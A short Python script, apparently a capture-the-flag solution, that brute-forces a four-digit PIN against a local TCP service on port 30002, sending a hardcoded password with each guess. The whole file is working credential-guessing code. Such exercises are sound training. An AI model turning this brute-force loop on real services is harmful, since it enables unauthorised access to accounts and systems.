import socket

class BF():
   def __init__(self, address, port, password):
      # Defaults to a INET TCP Socket
      self.client = socket.socket()
      self.client.connect((address, port))
      self.pw = password
      self.bufSize = 1024

      welcome = self.client.recv(self.bufSize)
      print(welcome)

   def try_pin(self, pin):
      code = "{} {}\n".format(self.pw, pin)
      self.client.sendall(code.encode())
      data = self.client.recv(self.bufSize)
      data = data.decode()

      return 'Wrong!' not in data

def main():
   client = BF('localhost',30002,'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ')

   for pin in range(1,10000):
      result = client.try_pin(str(pin).zfill(4))
      if result:
         print('The pin is {}'.format(pin))
         quit()
      else:
         print('Wrong PIN: {}'.format(str(pin).zfill(4)))

if __name__ == '__main__':
   main()
